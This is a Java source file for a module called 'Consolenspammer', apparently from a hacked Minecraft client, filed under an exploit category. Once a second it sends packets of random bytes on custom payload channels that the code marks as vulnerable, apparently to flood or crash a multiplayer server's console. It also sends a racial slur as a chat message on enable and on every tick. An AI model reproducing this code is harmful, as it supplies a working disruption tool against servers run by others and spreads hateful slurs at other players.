package me.bratwurst.module.modules.Crasher;

import io.netty.buffer.Unpooled;
import me.bratwurst.Client;
import me.bratwurst.event.EventTarget;
import me.bratwurst.event.events.EventUpdate;
import me.bratwurst.module.Category;
import me.bratwurst.module.Module;
import me.bratwurst.utils.PlayerUtil;
import me.bratwurst.utils.TimeHelper;
import me.pseey.utils.player.PlayerUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.util.Random;

public class Consolenspammer extends Module {
    private PacketBuffer payload;

    private Random random;

    private final String[] vulnerableChannels = new String[] { "MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem" };
    boolean Zensiert = false;
    public Consolenspammer() {
        super("Consolenspammer", Category.EXPLOIT);
    }
    @EventTarget
    public void onUpdate(EventUpdate event) {
        if (TimeHelper.hasReached(1000)) {
            PlayerUtils.sendMessage("Niger2");
            Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue((Packet)new C17PacketCustomPayload(
                    this.vulnerableChannels[this.random.nextInt(this.vulnerableChannels.length)],
                    this.payload));
        }

    }

    @Override
    public void onEnable() {
        super.onEnable();
        PlayerUtils.sendMessage("Nigger");
        this.random = new Random();
        this.payload = new PacketBuffer(Unpooled.buffer());
        byte[] rawPayload = new byte[this.random.nextInt(128)];
        this.random.nextBytes(rawPayload);
        this.payload.writeBytes(rawPayload);
    }
}

